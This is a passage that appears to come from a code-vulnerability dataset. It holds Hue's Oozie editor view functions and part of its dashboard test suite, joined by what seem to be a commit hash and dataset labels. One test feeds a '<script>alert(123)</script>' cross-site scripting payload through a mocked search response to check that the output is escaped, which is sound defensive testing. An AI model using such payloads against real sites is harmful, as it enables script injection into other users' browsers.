    wid = {}
    if workflow_id.isdigit():
      wid['id'] = workflow_id
    else:
      wid['uuid'] = workflow_id
    doc = Document2.objects.get(type='oozie-workflow2', **wid)
    workflow = Workflow(document=doc)
  else:
    doc = None
    workflow = Workflow()
    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)
  
  workflow_data = workflow.get_data()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  return render('editor/workflow_editor.mako', request, {
      'layout_json': json.dumps(workflow_data['layout']),
      'workflow_json': json.dumps(workflow_data['workflow']),
      'credentials_json': json.dumps(credentials.credentials.keys()),
      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),
      'doc1_id': doc.doc.get().id if doc else -1,
      'subworkflows_json': json.dumps(_get_workflows(request.user)),
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_workflow(request):
  return edit_workflow(request)


def delete_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(id=job['id'])
    doc = doc2.doc.get()
    doc.can_write_or_exception(request.user)
    
    doc.delete()
    doc2.delete()

  response = {}
  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def copy_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])
    
    name = doc2.name + '-copy'
    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)
  
    doc2.pk = None
    doc2.id = None
    doc2.uuid = str(uuid.uuid4())
    doc2.name = name
    doc2.owner = request.user    
    doc2.save()
  
    doc2.doc.all().delete()
    doc2.doc.add(copy_doc)
    
    workflow = Workflow(document=doc2)
    workflow.update_name(name)
    doc2.update_data({'workflow': workflow.get_data()['workflow']})
    doc2.save()

    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)

  response = {}  
  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_modify_permission()
def save_workflow(request):
  response = {'status': -1}

  workflow = json.loads(request.POST.get('workflow', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  if workflow.get('id'):
    workflow_doc = Document2.objects.get(id=workflow['id'])
  else:      
    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)
    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')

  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']
  if subworkflows:
    dependencies = Document2.objects.filter(uuid__in=subworkflows)
    workflow_doc.dependencies = dependencies

  workflow_doc.update_data({'workflow': workflow})
  workflow_doc.update_data({'layout': layout})
  workflow_doc.name = workflow['name']
  workflow_doc.save()
  
  workflow_instance = Workflow(document=workflow_doc)
  
  response['status'] = 0
  response['id'] = workflow_doc.id
  response['doc1_id'] = workflow_doc.doc.get().id
  response['message'] = _('Page saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def new_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))

  properties = NODES[node['widgetType']].get_mandatory_fields()
  workflows = []

  if node['widgetType'] == 'subworkflow-widget':
    workflows = _get_workflows(request.user)

  response['status'] = 0
  response['properties'] = properties 
  response['workflows'] = workflows
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def _get_workflows(user):
  return [{
        'name': workflow.name,
        'owner': workflow.owner.username,
        'value': workflow.uuid,
        'id': workflow.id
      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]
    ]  


def add_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))
  properties = json.loads(request.POST.get('properties', '{}'))
  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))

  _properties = dict(NODES[node['widgetType']].get_fields())
  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))

  if copied_properties:
    _properties.update(copied_properties)

  response['status'] = 0
  response['properties'] = _properties
  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def action_parameters(request):
  response = {'status': -1}
  parameters = set()

  try:
    node_data = json.loads(request.POST.get('node', '{}'))
    
    parameters = parameters.union(set(Node(node_data).find_parameters()))
    
    script_path = node_data.get('properties', {}).get('script_path', {})
    if script_path:
      script_path = script_path.replace('hdfs://', '')

      if request.fs.do_as_user(request.user, request.fs.exists, script_path):
        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  

        if node_data['type'] in ('hive', 'hive2'):
          parameters = parameters.union(set(find_dollar_braced_variables(data)))
        elif node_data['type'] == 'pig':
          parameters = parameters.union(set(find_dollar_variables(data)))
                
    response['status'] = 0
    response['parameters'] = list(parameters)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def workflow_parameters(request):
  response = {'status': -1}

  try:
    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) 

    response['status'] = 0
    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_workflow(request):
  response = {'status': -1}

  try:
    workflow_json = json.loads(request.POST.get('workflow', '{}'))
  
    workflow = Workflow(workflow=workflow_json)
  
    response['status'] = 0
    response['xml'] = workflow.to_xml()
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_workflow(request, doc_id):
  workflow = Workflow(document=Document2.objects.get(id=doc_id))
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)    

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])

      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)

      request.info(_('Workflow submitted'))
      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = workflow.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

    popup = render('editor/submit_job_popup.mako', request, {
                     'params_form': params_form,
                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})
                   }, force_template=True).content
    return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_workflow(user, fs, jt, workflow, mapping):
  try:
    submission = Submission(user, workflow, fs, jt, mapping)
    job_id = submission.run()
    return job_id
  except RestException, ex:
    detail = ex._headers.get('oozie-error-message', ex)
    if 'Max retries exceeded with url' in str(detail):
      detail = '%s: %s' % (_('The Oozie server is not running'), detail)
    LOG.error(smart_str(detail))
    raise PopupException(_(""Error submitting workflow %s"") % (workflow,), detail=detail)

  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))



def list_editor_coordinators(request):
  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/list_editor_coordinators.mako', request, {
      'coordinators': coordinators
  })


@check_document_access_permission()
def edit_coordinator(request):
  coordinator_id = request.GET.get('coordinator')
  doc = None
  
  if coordinator_id:
    doc = Document2.objects.get(id=coordinator_id)
    coordinator = Coordinator(document=doc)
  else:
    coordinator = Coordinator()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):
    raise PopupException(_('You don\'t have access to the workflow of this coordinator.'))

  return render('editor/coordinator_editor.mako', request, {
      'coordinator_json': coordinator.json,
      'credentials_json': json.dumps(credentials.credentials.keys()),
      'workflows_json': json.dumps(workflows),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_coordinator(request):
  return edit_coordinator(request)


@check_document_modify_permission()
def save_coordinator(request):
  response = {'status': -1}

  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))

  if coordinator_data.get('id'):
    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])
  else:      
    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)
    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')

  if coordinator_data['properties']['workflow']:
    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)
    coordinator_doc.dependencies = dependencies

  coordinator_doc.update_data(coordinator_data)
  coordinator_doc.name = coordinator_data['name']
  coordinator_doc.save()
  
  response['status'] = 0
  response['id'] = coordinator_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_coordinator(request):
  response = {'status': -1}

  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))

  coordinator = Coordinator(data=coordinator_dict)

  response['status'] = 0
  response['xml'] = coordinator.to_xml()
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"") 


@check_document_access_permission()
def submit_coordinator(request, doc_id):
  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_coordinator(request, coordinator, mapping)

      request.info(_('Coordinator submitted.'))
      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = coordinator.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_coordinator(request, coordinator, mapping):
  try:
    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])
    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()

    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}
    properties.update(mapping)

    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting coordinator %s"") % (coordinator,),
                         detail=ex._headers.get('oozie-error-message', ex))
    
    
    

def list_editor_bundles(request):
  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]

  return render('editor/list_editor_bundles.mako', request, {
      'bundles': bundles
  })


@check_document_access_permission()
def edit_bundle(request):
  bundle_id = request.GET.get('bundle')
  doc = None
  
  if bundle_id:
    doc = Document2.objects.get(id=bundle_id)
    bundle = Bundle(document=doc)
  else:
    bundle = Bundle()

  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/bundle_editor.mako', request, {
      'bundle_json': bundle.json,
      'coordinators_json': json.dumps(coordinators),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      
  })


def new_bundle(request):
  return edit_bundle(request)


@check_document_modify_permission()
def save_bundle(request):
  response = {'status': -1}

  bundle_data = json.loads(request.POST.get('bundle', '{}'))

  if bundle_data.get('id'):
    bundle_doc = Document2.objects.get(id=bundle_data['id'])
  else:      
    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)
    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')

  if bundle_data['coordinators']:
    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)    
    bundle_doc.dependencies = dependencies

  bundle_doc.update_data(bundle_data)
  bundle_doc.name = bundle_data['name']
  bundle_doc.save()
  
  response['status'] = 0
  response['id'] = bundle_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_bundle(request, doc_id):
  bundle = Bundle(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_bundle(request, bundle, mapping)

      request.info(_('Bundle submitted.'))
      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = bundle.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_bundle(request, bundle, properties):
  try:
    deployment_mapping = {}
    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])
    
    for i, bundled in enumerate(bundle.data['coordinators']):
      coord = coords[bundled['coordinator']]
      workflow = Workflow(document=coord.dependencies.all()[0])
      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      
      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)
      
      coordinator = Coordinator(document=coord)
      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()
      deployment_mapping['coord_%s_dir' % i] = coord_dir
      deployment_mapping['coord_%s' % i] = coord

    properties.update(deployment_mapping)
    
    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting bundle %s"") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))

/n/n/n",1
82,37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d,"desktop/libs/dashboard/src/dashboard/tests.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json

from django.contrib.auth.models import User
from django.core.urlresolvers import reverse

from nose.tools import assert_true, assert_false, assert_equal, assert_not_equal

from desktop.lib.django_test_util import make_logged_in_client
from desktop.lib.test_utils import grant_access
from desktop.lib.rest import resource
from desktop.models import Document2

from dashboard.facet_builder import _round_number_range
from dashboard.models import Collection2, augment_response
from dashboard.controller import DashboardController


QUERY = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}


def test_ranges():
  assert_equal((90.0, 100.0), _round_number_range(99))
  assert_equal((0.0, 100.0), _round_number_range(100))
  assert_equal((0.0, 100.0), _round_number_range(101))

  assert_equal((8000000.0, 9000000.0), _round_number_range(9045352))


class MockResource():
  RESPONSE = None

  def __init__(self, client):
    pass

  @classmethod
  def set_solr_response(cls, response):
    MockResource.RESPONSE = response

  def invoke(self, method, *args, **kwargs):
    if method.lower() == 'head':
      return self.head(*args, **kwargs)
    elif method.lower() == 'get':
      return self.get(*args, **kwargs)
    else:
      raise Exception('do not know how to handle %s' % method)

  def head(self, *args, **kwargs):
    return ''

  def get(self, *args, **kwargs):
    if 'collection_1/admin/file' in args[0]:
      return SOLR_SCHEMA
    elif 'collection_1/admin/luke' in args[0]:
      if ('show', 'schema') in kwargs['params']:
        return SOLR_LUKE_SCHEMA
      else:
        return SOLR_LUKE_
    else:
      return MockResource.RESPONSE


class TestSearchBase(object):

  def setUp(self):
    self.c = make_logged_in_client(username='test_dashboard', is_superuser=False)
    self.client_not_me = make_logged_in_client(username=""not_perm_user"", groupname=""default"", recreate=True, is_superuser=False)

    self.user = User.objects.get(username='test_dashboard')
    self.user_not_me = User.objects.get(username=""not_perm_user"")

    grant_access('test_dashboard', 'test_dashboard', 'dashboard')
    grant_access(self.user.username, self.user.username, ""desktop"")
    grant_access('not_perm_user', 'not_perm_user', 'dashboard')
    grant_access(self.user_not_me.username, self.user_not_me.username, ""desktop"")

    self.home_dir = Document2.objects.get_home_directory(user=self.user)

    self.prev_resource = resource.Resource
    resource.Resource = MockResource

    self.collection = Collection2(user=self.user, name='collection_1')

    MockResource.set_solr_response(""""""{
      ""responseHeader"": {
        ""status"": 0,
        ""QTime"": 0,
        ""params"": {
          ""indent"": ""true"",
          ""q"": ""*:*"",
          ""_"": ""1442953203972"",
          ""wt"": ""json""
        }
      },
      ""response"": {
        ""numFound"": 1,
        ""start"": 0,
        ""docs"": [
          {
            ""id"": ""change.me"",
            ""title"": [
              ""val1"",
              ""val2"",
              ""[val3]"",
              ""val4""
            ],
            ""_version_"": 1513046095083602000
          }
        ]
      }
      }"""""")

  def tearDown(self):
    # Remove monkey patching
    resource.Resource = self.prev_resource


class TestWithMockedSolr(TestSearchBase):

  def _get_collection_param(self, collection):
    col_json = json.loads(collection.get_json(self.user))
    return col_json['collection']

  def test_index(self):
    response = self.c.get(reverse('dashboard:index'))
    assert_true('dashboard' in response.content, response.content)

  def test_share_dashboard(self):
    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,
                                   data=self.collection.data, parent_directory=self.home_dir)

    # owner can view document
    response = self.c.get('/desktop/api2/doc/', {'uuid': doc.uuid})
    data = json.loads(response.content)
    assert_equal(doc.uuid, data['document']['uuid'], data)

    # other user cannot view document
    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc.uuid})
    data = json.loads(response.content)
    assert_equal(-1, data['status'])

    # There are no collections with user_not_me
    controller = DashboardController(self.user_not_me)
    hue_collections = controller.get_search_collections()
    assert_true(len(hue_collections) == 0)

    # Share read perm by users
    response = self.c.post(""/desktop/api2/doc/share"", {
        'uuid': json.dumps(doc.uuid),
        'data': json.dumps({
            'read': {
                'user_ids': [
                    self.user.id,
                    self.user_not_me.id
                ],
                'group_ids': [],
            },
            'write': {
                'user_ids': [],
                'group_ids': [],
            }
        })
    })
    assert_equal(0, json.loads(response.content)['status'], response.content)
    assert_true(doc.can_read(self.user))
    assert_true(doc.can_write(self.user))
    assert_true(doc.can_read(self.user_not_me))
    assert_false(doc.can_write(self.user_not_me))

    # other user can view document
    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc.uuid})
    data = json.loads(response.content)
    assert_equal(doc.uuid, data['document']['uuid'], data)

    # other user can open dashboard
    response = self.c.post(reverse('dashboard:search'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })

    data = json.loads(response.content)
    assert_true('response' in data, data)
    assert_true('docs' in data['response'], data)

    # For self.user_not_me
    controller = DashboardController(self.user_not_me)
    hue_collections = controller.get_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')

    hue_collections = controller.get_owner_search_collections()
    assert_equal(len(hue_collections), 0)

    hue_collections = controller.get_shared_search_collections()
    assert_equal(len(hue_collections), 0)

    # For self.user
    controller = DashboardController(self.user)
    hue_collections = controller.get_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')

    hue_collections = controller.get_owner_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')

    hue_collections = controller.get_shared_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')

    user_not_me_home_dir = Document2.objects.get_home_directory(user=self.user_not_me)
    doc1 = Document2.objects.create(name='test_dashboard1', type='search-dashboard', owner=self.user_not_me,
                                   data=self.collection.data, parent_directory=user_not_me_home_dir)
    # self.user_not_me can view document
    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc1.uuid})
    data = json.loads(response.content)
    assert_equal(doc1.uuid, data['document']['uuid'], data)

    # self.user cannot view document
    response = self.c.get('/desktop/api2/doc/', {'uuid': doc1.uuid})
    data = json.loads(response.content)
    assert_equal(-1, data['status'])

    # Share read perm by users
    response = self.client_not_me.post(""/desktop/api2/doc/share"", {
        'uuid': json.dumps(doc1.uuid),
        'data': json.dumps({
            'read': {
                'user_ids': [
                    self.user.id,
                ],
                'group_ids': [],
            },
            'write': {
                'user_ids': [],
                'group_ids': [],
            }
        })
    })
    assert_equal(0, json.loads(response.content)['status'], response.content)
    assert_true(doc1.can_read(self.user))
    assert_false(doc1.can_write(self.user))
    assert_true(doc1.can_read(self.user_not_me))
    assert_true(doc1.can_write(self.user_not_me))

    # For self.user_not_me
    controller = DashboardController(self.user_not_me)
    hue_collections = controller.get_search_collections()
    assert_equal(len(hue_collections), 2)

    hue_collections = controller.get_owner_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard1')

    hue_collections = controller.get_shared_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard1')

    # For self.user
    controller = DashboardController(self.user)
    hue_collections = controller.get_search_collections()
    assert_equal(len(hue_collections), 2)

    hue_collections = controller.get_owner_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')

    hue_collections = controller.get_shared_search_collections()
    assert_equal(len(hue_collections), 1)
    assert_equal(hue_collections[0].name, 'test_dashboard')


  def test_update_document(self):
    # Regular user
    response = self.c.post(reverse('dashboard:update_document'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'document': json.dumps({'hasChanged': False})
    })

    data = json.loads(response.content)
    assert_equal(-1, data['status'], response.content)
    assert_true('denied' in data['message'], response.content)

    # Admin
    c = make_logged_in_client(username='admin', is_superuser=True, recreate=True)
    response = c.post(reverse('dashboard:update_document'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'document': json.dumps({'hasChanged': False})
    })

    data = json.loads(response.content)
    assert_equal(0, data['status'], response.content)
    assert_true('no modifications to change' in data['message'], response.content)

  def test_strip_nulls(self):
    response = '{""uid"":""1111111"",""method"":""check_user""}\x00'
    response = json.loads(response.replace('\x00', '')) # Does not call real API

  def test_convert_schema_fields_to_luke(self):
    schema_fields = {u'fields': [
        {u'indexed': True, u'stored': True, u'type': u'long', u'name': u'_version_'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tdate', u'name': u'created_at'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'expanded_url'},
        {u'uniqueKey': True, u'name': u'id', u'required': True, u'stored': True, u'indexed': True, u'type': u'tlong'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tlong', u'name': u'in_reply_to_status_id'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'in_reply_to_user_id'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'media_url_https'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'retweet_count'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'source'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'text'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_followers_count'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_friends_count'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'user_location'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'user_name'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'user_screen_name'},
        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_statuses_count'}
        ], u'responseHeader': {u'status': 0, u'QTime': 1}
    }
    assert_equal([
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'long', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tdate', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},
        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tlong', u'copyDests': []},
        {'uniqueKey': True, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tlong', u'copyDests': []}
        ],
        sorted(Collection2._make_luke_from_schema_fields(schema_fields).values())
    )

  def test_response_escaping_multi_value(self):
    MockResource.set_solr_response(""""""{
      ""responseHeader"": {
        ""status"": 0,
        ""QTime"": 0,
        ""params"": {
          ""indent"": ""true"",
          ""q"": ""*:*"",
          ""_"": ""1442953203972"",
          ""wt"": ""json""
        }
      },
      ""response"": {
        ""numFound"": 1,
        ""start"": 0,
        ""docs"": [
          {
            ""id"": ""change.me"",
            ""title"": [
              ""val1"",
              ""val2"",
              ""[<script>alert(123)</script>]"",
              ""val4""
            ],
            ""_version_"": 1513046095083602000
          }
        ]
      }
    }"""""")

    response = self.c.post(reverse('dashboard:search'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })

    result = json.loads(response.content)
    assert_equal(
        [{'hueId': 'change.me', 'id': 'change.me', '_version_': 1513046095083602000, 'title': ['val1', 'val2', '[&lt;script&gt;alert(123)&lt;/script&gt;]', 'val4'], 'details': [], 'externalLink': None}],
        result['response']['docs']
    )

  def test_response_with_facets(self):
    MockResource.set_solr_response(""""""{""responseHeader"":{""status"":0,""QTime"":59,""params"":{""facet"":""true"",""facet.mincount"":""1"",""facet.limit"":""100"",""facet.date"":""article_date"",""f.article_date.facet.date.start"":""NOW-7MONTH/DAYS"",""wt"":""json"",""rows"":""15"",""user.name"":""hue"",""start"":""0"",""facet.sort"":""count"",""q"":""*:*"",""f.article_date.facet.date.end"":""NOW-5MONTH"",""doAs"":""romain"",""f.article_date.facet.date.gap"":""+1DAYS"",""facet.field"":[""journal_title"",""author_facet""],""fq"":[""article_date:[2013-06-13T00:00:00Z TO 2013-06-13T00:00:00Z+1DAYS]"",""journal_title:\\""in\\""""]}},""response"":{""numFound"":4,""start"":0,""maxScore"":1.0,""docs"":[{""article_title"":""Investigations for neonatal seizures."",""journal_issn"":""1878-0946"",""article_abstract_text"":[""Seizures during the neonatal period are always medical emergencies. Apart from the need for rapid anticonvulsive treatment, the underlying condition is often not immediately obvious. In the search for the correct diagnosis, a thorough history, clinical examination, laboratory work-up, neurophysiological and neuroradiological investigations are all essential. A close collaboration between neonatologists, neuropaediatricians, laboratory specialists, neurophysiologists and radiologists facilitates the adequate care of the infant.""],""ontologies"":[""36481|1 